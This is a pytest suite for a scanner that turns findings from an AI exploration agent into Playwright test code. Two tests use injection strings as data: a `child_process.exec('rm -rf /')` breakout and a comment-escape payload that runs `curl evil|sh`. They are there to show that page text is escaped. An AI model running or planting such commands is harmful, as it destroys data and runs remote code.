"""Exported Playwright tests: correct code, safe strings, honest status."""

import json
from types import SimpleNamespace

import pytest

from app.config import Settings
from app.models import Finding
from app.scanner.agent import ExplorationAgent
from app.scanner.findings import FindingCollector
from app.scanner.observations import ObservationLog
from app.scanner.playwright_export import (
    Expectation,
    TestAction,
    attach_automated_tests,
    build_test,
    js,
    render_locator,
    render_suite,
    select_segment,
)
from app.scanner.usage import UsageTracker

LOGIN = "https://app.example/login"
BUTTON = {"kind": "role", "role": "button", "name": "Login"}
USER = {"kind": "label", "value": "Username"}


def test_strings_are_escaped_into_literals_so_page_text_cannot_become_code() -> None:
    hostile = "x'); require('child_process').exec('rm -rf /'); ('"
    literal = js(hostile)
    assert json.loads(literal) == hostile  # it round-trips as data
    line = TestAction("act-1", "fill", LOGIN, LOGIN, "Username", hostile, USER).code()
    assert line == f'await page.getByLabel("Username", {{ exact: true }}).fill({literal});'


@pytest.mark.parametrize(
    ("desc", "expected"),
    [
        (BUTTON, 'page.getByRole("button", { name: "Login", exact: true })'),
        (USER, 'page.getByLabel("Username", { exact: true })'),
        (
            {"kind": "placeholder", "value": "Email"},
            'page.getByPlaceholder("Email", { exact: true })',
        ),
        ({"kind": "testid", "value": "submit"}, 'page.getByTestId("submit")'),
        ({"kind": "css", "value": "#login"}, 'page.locator("#login")'),
        ({"kind": "text", "value": "Sign in"}, 'page.getByText("Sign in", { exact: true })'),
        (None, None),
    ],
)
def test_locators_render_the_way_a_developer_would_write_them(desc, expected) -> None:
    assert render_locator(desc) == expected


_JS_LINE_BREAKS = ("\r\n", "\n", "\r", " ", " ")


def _js_lines(code: str) -> list[str]:
    """Split source the way a JavaScript parser does: on every line terminator."""
    for terminator in _JS_LINE_BREAKS[1:]:
        code = code.replace(terminator, "\n")
    return code.split("\n")


@pytest.mark.parametrize("line_break", ["\n", "\r", " ", " "])
def test_text_in_comments_cannot_break_out_and_become_code(line_break: str) -> None:
    payload = f"harmless{line_break}require('child_process').exec('curl evil|sh')//"
    todo_step = TestAction("act-1", "fill", LOGIN, LOGIN, f"“{payload}” into Name", "x", None)
    test = build_test(
        title="t",
        start_url=LOGIN,
        actions=[todo_step],
        expectation=Expectation(type="none", description=payload),
        status="unverified",
        note="",
    )
    for line in _js_lines(test.code):
        if "child_process" in line:
            assert line.lstrip().startswith("//"), f"escaped its comment: {line!r}"


def test_literals_escape_the_line_breaks_json_leaves_raw() -> None:
    literal = js("a b c")
    assert " " not in literal and " " not in literal
    assert json.loads(literal) == "a b c"


def test_an_element_without_a_unique_locator_becomes_a_todo_not_a_guess() -> None:
    action = TestAction("act-2", "click", LOGIN, LOGIN, "Mystery", "", None)
    assert action.code().startswith("// TODO: click")
    assert not action.replayable


@pytest.mark.parametrize(
    ("kind", "text", "locator", "expected"),
    [
        (
            "text_visible",
            "Password is required",
            None,
            'await expect(page.getByText("Password is required")).toBeVisible();',
        ),
        (
            "text_not_visible",
            "Your username is invalid!",
            None,
            'await expect(page.getByText("Your username is invalid!")).toHaveCount(0);',
        ),
        (
            "url_contains",
            "/secure",
            None,
            'await expect(page).toHaveURL(new RegExp("\\\\/secure"));',
        ),
        (
            "element_visible",
            "",
            BUTTON,
            'await expect(page.getByRole("button", { name: "Login", exact: true })).toBeVisible();',
        ),
        (
            "element_text",
            "Welcome",
            BUTTON,
            'await expect(page.getByRole("button", { name: "Login", exact: true }))'
            '.toContainText("Welcome");',
        ),
        ("no_console_errors", "", None, "expect(errors).toEqual([]);"),
    ],
)
def test_expectations_render_to_assertions(kind, text, locator, expected) -> None:
    assert Expectation(kind, text, "", locator).lines() == [expected]


def test_an_inexpressible_expectation_is_a_visible_todo() -> None:
    expectation = Expectation("none", "", "the page explains why sign-in failed")
    assert not expectation.checkable
    assert expectation.lines() == ["// TODO: assert that the page explains why sign-in failed"]


def test_segment_replays_the_fields_a_submit_depended_on_but_not_other_pages() -> None:
    home = "https://app.example/"
    actions = [
        TestAction("act-1", "click", home, LOGIN, "Sign in", "", BUTTON),
        TestAction("act-2", "fill", LOGIN, LOGIN, "Username", "tomsmith", USER),
        TestAction("act-3", "fill", LOGIN, LOGIN, "Password", "wrong", USER),
        TestAction("act-4", "click", LOGIN, LOGIN, "Login", "", BUTTON),
    ]
    # The finding cites only the submit; the fills before it on the same page come along.
    assert [a.act_id for a in select_segment(actions, ["act-4", "obs-9"])] == [
        "act-2",
        "act-3",
        "act-4",
    ]
    # Nothing cited: replay from the last page change up to the report.
    assert [a.act_id for a in select_segment(actions, [])] == ["act-2", "act-3", "act-4"]
    assert select_segment([], ["act-1"]) == []


def test_a_generated_file_is_a_complete_playwright_spec() -> None:
    actions = [
        TestAction("act-2", "fill", LOGIN, LOGIN, "Username", "tomsmith", USER),
        TestAction("act-4", "click", LOGIN, LOGIN, "Login", "", BUTTON),
    ]
    test = build_test(
        title='Login says "username is invalid"',
        start_url=LOGIN,
        actions=actions,
        expectation=Expectation("text_not_visible", "Your password is invalid!", "one message"),
        status="fails-now",
        note="",
    )
    code = test.code
    assert code.startswith("import { test, expect } from '@playwright/test';")
    assert 'test("Login says \\"username is invalid\\"", async ({ page }) => {' in code
    assert f"  await page.goto({js(LOGIN)});" in code
    assert '  await page.getByLabel("Username", { exact: true }).fill("tomsmith");' in code
    assert "  // Expected once fixed: one message" in code
    assert code.rstrip().endswith("});")


def test_console_expectation_installs_its_listener_before_navigating() -> None:
    body = build_test(
        title="t",
        start_url=LOGIN,
        actions=[],
        expectation=Expectation("no_console_errors"),
        status="fails-now",
        note="",
    ).body
    assert body.index("const errors: string[] = [];") < body.index(f"await page.goto({js(LOGIN)});")


def _finding(fid: str, kind: str, ids: list[str], source: str = "automated") -> Finding:
    return Finding(
        id=fid,
        title=f"Issue {fid}",
        category="bug",
        severity="medium",
        confidence="high",
        kind=kind,
        source=source,
        location="/",
        evidence="e",
        steps=["s"],
        suggestion="x",
        evidence_ids=ids,
    )


def test_browser_verified_findings_get_tests_without_any_model_input() -> None:
    log = ObservationLog()
    log.add("console-error", LOGIN, "boom")
    log.add("http-error", LOGIN, "GET /api 500", url="https://app.example/api", status=500)
    log.add("broken-link", LOGIN, "404", url="https://app.example/gone", status=404)
    findings = [
        _finding("f-1", "console", ["obs-1"]),
        _finding("f-2", "network", ["obs-2"]),
        _finding("f-3", "broken-link", ["obs-3"]),
        _finding("f-4", "seo", ["obs-1"]),
    ]
    attach_automated_tests(findings, log)

    assert "expect(errors).toEqual([]);" in findings[0].playwright_test
    assert '"https://app.example/api"' in findings[1].playwright_test
    assert "expect(response.ok()).toBeTruthy();" in findings[2].playwright_test
    assert findings[3].playwright_test is None  # no meaningful automated test for metadata
    assert all(f.test_status == "fails-now" for f in findings[:3])


def test_suite_has_one_import_and_unique_titles() -> None:
    log = ObservationLog()
    log.add("console-error", LOGIN, "boom")
    findings = [_finding("f-1", "console", ["obs-1"]), _finding("f-2", "console", ["obs-1"])]
    attach_automated_tests(findings, log)
    suite = render_suite(findings)
    assert suite.count("import { test, expect }") == 1
    assert 'test("f-1: Issue f-1"' in suite and 'test("f-2: Issue f-2"' in suite
    assert render_suite([_finding("f-9", "seo", [])]) is None


class _Session:
    def __init__(self, holds: bool | None) -> None:
        self.holds = holds
        self.page = SimpleNamespace(url=LOGIN)

    async def stable_locator(self, ref: str) -> dict:
        return BUTTON

    async def replay_holds(self, start_url, actions, kind, text, desc):  # noqa: ANN001, ANN201
        self.replayed = (start_url, [a.act_id for a in actions])
        return self.holds, "" if self.holds is not None else "navigation timed out"

    async def screenshot(self) -> bytes:
        return b"jpg"


class _Nothing:
    async def step(self, *args, **kwargs) -> None:
        return None

    async def advance(self, *args, **kwargs) -> None:
        return None

    async def save_jpeg(self, key: str, data: bytes) -> None:
        return None


def _agent(holds: bool | None) -> ExplorationAgent:
    agent = ExplorationAgent(
        client=None,
        settings=Settings(_env_file=None),
        session=_Session(holds),
        observations=ObservationLog(),
        collector=FindingCollector(),
        artifacts=_Nothing(),
        usage=UsageTracker("claude-opus-5-5"),
        recorder=_Nothing(),
        scan_id="s",
        deadline=0,
    )
    act = agent.observations.add("action", LOGIN, "clicked Login")
    agent.test_actions.append(TestAction(act.id, "click", LOGIN, LOGIN, "Login", "", BUTTON))
    return agent


@pytest.mark.parametrize(
    ("holds", "status", "phrase"),
    [
        (False, "fails-now", "fails today"),
        (True, "passes-now", "already holds"),
        (None, "unverified", "could not be checked"),
    ],
)
async def test_the_status_comes_from_replaying_the_steps_in_a_fresh_browser(holds, status, phrase):
    agent = _agent(holds)
    finding = _finding("f-1", "functional", ["act-1"], source="agent")
    reply = await agent._attach_test(
        finding,
        {"type": "text_visible", "text": "Password is required", "ref": "", "description": "d"},
        ["act-1"],
    )
    assert finding.test_status == status
    assert phrase in reply
    assert agent.session.replayed == (LOGIN, ["act-1"])
    assert 'await page.getByRole("button", { name: "Login", exact: true }).click();' in (
        finding.playwright_test
    )


async def test_an_inexpressible_expectation_is_never_claimed_as_verified() -> None:
    finding = _finding("f-1", "ux", ["act-1"], source="agent")
    await _agent(False)._attach_test(
        finding, {"type": "none", "text": "", "ref": "", "description": "clearer copy"}, ["act-1"]
    )
    assert finding.test_status == "unverified"
    assert "// TODO: assert that clearer copy" in finding.playwright_test


def test_a_non_exact_role_locator_renders_without_exact() -> None:
    desc = {"kind": "role", "role": "button", "name": "Login", "exact": False}
    assert render_locator(desc) == 'page.getByRole("button", { name: "Login" })'


def test_a_test_ends_at_the_last_action_its_finding_cites() -> None:
    actions = [
        TestAction("act-1", "click", LOGIN, LOGIN, "Login", "", BUTTON),
        TestAction("act-2", "fill", LOGIN, LOGIN, "Username", "tomsmith", USER),
        TestAction("act-3", "click", LOGIN, LOGIN, "Login", "", BUTTON),
    ]
    # An empty-form finding cites only the first submit. What the tester tried
    # afterwards is a different experiment and must not be replayed.
    assert [a.act_id for a in select_segment(actions, ["act-1"])] == ["act-1"]


def test_earlier_attempts_on_the_same_page_are_not_replayed() -> None:
    actions = [
        TestAction("act-1", "click", LOGIN, LOGIN, "Login", "", BUTTON),  # empty submit
        TestAction("act-2", "fill", LOGIN, LOGIN, "Username", " tomsmith", USER),
        TestAction("act-3", "click", LOGIN, LOGIN, "Login", "", BUTTON),  # leading-space try
        TestAction("act-4", "fill", LOGIN, LOGIN, "Username", "tomsmith", USER),
        TestAction("act-5", "fill", LOGIN, LOGIN, "Password", "wrong", USER),
        TestAction("act-6", "click", LOGIN, LOGIN, "Login", "", BUTTON),
    ]
    assert [a.act_id for a in select_segment(actions, ["act-6"])] == ["act-4", "act-5", "act-6"]
